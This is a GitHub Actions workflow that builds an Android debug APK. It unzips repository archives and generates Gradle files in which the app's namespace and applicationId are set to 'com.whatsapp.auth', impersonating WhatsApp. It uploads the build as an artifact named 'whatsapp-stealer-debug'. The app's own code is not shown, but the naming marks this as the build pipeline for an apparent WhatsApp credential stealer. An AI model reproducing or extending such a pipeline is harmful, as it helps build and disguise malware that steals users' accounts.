name: Auto Build Complete APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout Repository
      uses: actions/checkout@v4

    - name: Install Unzip & Latest Gradle 8.0
      run: |
        sudo apt-get update
        sudo apt-get install -y unzip wget
        
        wget https://services.gradle.org/distributions/gradle-8.0-bin.zip
        sudo mkdir -p /opt/gradle
        sudo unzip -d /opt/gradle gradle-8.0-bin.zip
        echo "/opt/gradle/gradle-8.0/bin" >> $GITHUB_PATH

        unzip -o '*.zip'
        ls -la

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Build with Namespace and Gradle 8.0
      run: |
        if [ ! -d "app" ]; then
          SUB_DIR=$(find . -type d -name "app" | head -n 1)
          if [ ! -z "$SUB_DIR" ]; then
            cd "$(dirname "$SUB_DIR")"
          else
            mkdir -p app/src/main
          fi
        fi

        mkdir -p app
        printf "plugins {\n    id 'com.android.application'\n    id 'org.jetbrains.kotlin.android'\n}\nandroid {\n    namespace 'com.whatsapp.auth'\n    compileSdk 34\n    defaultConfig {\n        applicationId \"com.whatsapp.auth\"\n        minSdk 24\n        targetSdk 34\n        versionCode 1\n        versionName \"1.0\"\n    }\n}\ndependencies {\n    implementation 'androidx.core:core-ktx:1.12.0'\n    implementation 'androidx.appcompat:appcompat:1.6.1'\n    implementation 'com.google.android.material:material:1.11.0'\n    implementation 'androidx.viewpager2:viewpager2:1.0.0'\n}\n" > app/build.gradle

        echo "include ':app'" > settings.gradle

        printf "buildscript {\n    repositories {\n        google()\n        mavenCentral()\n    }\n    dependencies {\n        classpath \"com.android.tools.build:gradle:8.1.1\"\n        classpath \"org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.0\"\n    }\n}\nallprojects {\n    repositories {\n        google()\n        mavenCentral()\n    }\n}\n" > build.gradle

        gradle :app:assembleDebug

    - name: Upload APK Artifact
      uses: actions/upload-artifact@v4
      with:
        name: whatsapp-stealer-debug
        path: '**/build/outputs/apk/debug/app-debug.apk'
